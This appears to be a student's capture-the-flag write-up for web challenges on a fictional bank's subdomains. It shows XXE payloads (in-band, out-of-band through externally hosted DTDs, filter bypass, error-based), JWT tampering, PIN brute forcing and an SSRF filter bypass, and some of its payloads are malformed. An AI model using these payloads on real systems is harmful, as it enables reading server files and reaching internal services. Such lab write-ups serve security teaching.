## v1.feedifier.quoccabank.com

Used pastebin raw paste - https://pastebin.com/RyQepthP

In-band basic xxe payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM 'file:///flag_64b3ebd165d9508735bc8a29ddebb285'> ]>
<rss> <channel>
<item> <description>1</description> <link>1</link> <title>&xxe;</title>
</item> </channel> </rss>
```

## v2.feedifier.quoccabank.com (TBD) 
Used pastebin + locally hosted url (since I wanted http)

Out-band xxe payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
  <!ENTITY % dtd SYSTEM "http://strong-gecko-39.loca.lt/feedifierv2.txt">
  %dtd;
]>
<rss>
<channel>
	<item>
		<description>1</description>
		<link> 1</link>
		<title>&inject;</title>
	</item>
</channel>
</rss>
```

And at http://strong-gecko-39.loca.lt/feedifierv2.txt
```xml
<!ENTITY inject SYSTEM "file:///flag_0054c423ef634e00b4a586f4142e7522">
```


# v3.feedifier.quoccabank.com
1. Here, the sanitiser was checking keywords in my secondary file. (probably a regex matching). 
So, to bypass this, you can try using hex encodings (Eg; f is 0x66)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://warm-panther-32.loca.lt/payload3.txt">
  %dtd;
  %comb;
]>
<rss>
<channel>
	<item>
		<description>1;</description>
		<link> 1;</link>
		<title>&inject;</title>
	</item>
</channel>
</rss>
```xml

At http://strong-gecko-39.loca.lt/feedifierv2.txt:
```xml
<!ENTITY % comb "<!ENTITY inject SYSTEM '&#x66;ile:///&#x66;lag_d9cd6fcd14d4597712c583d5fc1e5362'>">
```


2. Alternative method: Error based XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://warm-panther-32.loca.lt/payload3.txt">
  %dtd;
]>
<rss>
<channel>
	<item>
		<description>1</description>
		<link>1</link>
		<title>&dtd;</title>
	</item>
</channel>
</rss>
```


And at http://warm-panther-32.loca.lt/payload3.txt:
```xml
<!ENTITY % first "fi">
<!ENTITY % second "le:////fl">
<!ENTITY % third "ag_d9cd6fcd14d4597712c583d5fc1e5362">

<!ENTITY % dummy1 "<!ENTITY &#x25; trick SYSTEM '/%first%second%third;'>">

%dummy1         --->  resolved into <!ENTITY % trick SYSTEM 'file:///flag_{...}'>

<!ENTITY % dummy2 "<!ENTITY &#x25; error SYSTEM '/%trick;'>">

%dummy2         --> puts an invalid flag/flag/{...} file

%error 
```

# v3.feedifier.quoccabank.com
1. Overwrite a dtd defintion from docbook. Note: only the first definition is used and rest are ignored.
You need to find a paramterised definition which is also executed in the docbook

Error based extraction:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % importDocbook SYSTEM "file:///usr/share/sgml/docbook/dtd/4.5/docbookx.dtd">
  <!ENTITY % ISOamso '<!ENTITY &#37; flag SYSTEM "file:///flag{...}">'>
  <!ENTITY &#37; win "<!ENTITY &#38;#37; newvar SYSTEM "flag;">'>

  %importDocbook;
  %win;
]>
<rss>
<channel>
	<item>
		<description>1</description>
		<link>1</link>
		<title>&dtd;</title>
	</item>
</channel>
</rss>
```

# letters.quoccabank.com (TBD)

# signin (TBD)

# wallet.quoccabank.com

# notes.quoccabank.com
Access Control Vuln:  

1. Cookie was a JWT token.  
2. Changed username to admin, and modified expiry time to get flag

# files.quoccabank.com
Flag 1: Brute forcing the pins in `files.quoccabank.com/admin`  

Flag 2: Logging in as username=admin, password=0 (Got clue from sales.quoccabank)

Flag 3: Escalating privilege using /staff/wfh 

Flag 4: Why isnt my JWTtoken with flask key not working??


# ctfproxy2.quoccabank.com
Robots.txt shows a /flag path

In /flag path's source it is mentioned that "adam said we can't show our super secret flag to external users"

So perhaps there is a way to use the server to call /flag instead. (SSRF)

Navigate to ctfproxy2.quoccabank.com/me, I see potential to enter an internal link.
There is some WAF code in the src:
```js
my billion-dollar WAF machine learning algorithm:

    url = request.form.get("avatar", "")
    if not url.endswith(".png"):
      flash("Avatar must be png file!", "danger")
      return redirect(url_for("me"))
    try:
      blacklist = ['?', '127.', 'localhost', '0/', '::', '[', ']']
      for w in blacklist:
        if w in url:
          raise Exception("'%s' is dangerous" % w)
      try:
        domain = re.match(r"^https?://([a-zA-Z0-9-_.]+)", url).group(1)
      except IndexError:
        raise Exception("invalid url")
      ip = socket.gethostbyname(domain)
      if ipaddress.ip_address(unicode(ip)).is_private:
        raise Exception("it is forbidden to access internal server " + ip)
```

http://www.google.com@2130706433/flag#1.png